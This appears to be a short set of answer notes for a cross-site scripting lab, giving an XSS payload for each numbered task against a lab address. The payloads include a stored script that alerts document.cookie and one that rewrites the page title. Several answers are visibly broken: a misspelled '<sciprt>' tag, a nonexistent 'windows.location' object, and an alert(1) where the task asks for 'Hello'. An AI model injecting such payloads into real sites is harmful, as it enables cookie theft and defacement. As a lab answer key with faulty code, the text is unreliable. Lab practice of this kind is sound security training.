# Day7 : Cross-site Scipting
```

#2 Go to http://10.10.158.16/reflected and craft a reflected XSS payload that will cause a popup saying "Hello"
: <sciprt>alert(1);</script>

#3 On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.
: <script>windows.location.hostname</script>

#4 Now navigate to http://10.10.158.16/stored and make an account.Then add a comment and see if you can insert some of your own HTML.
: <input type="button" />

#5 On the same page, create an alert popup box appear on the page with your document cookies.
: <script>alert(document.cookie);</script>

#6 Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.
: <script>document.getElementById("thm-title").textContent = "I am a hacker"</script>

```
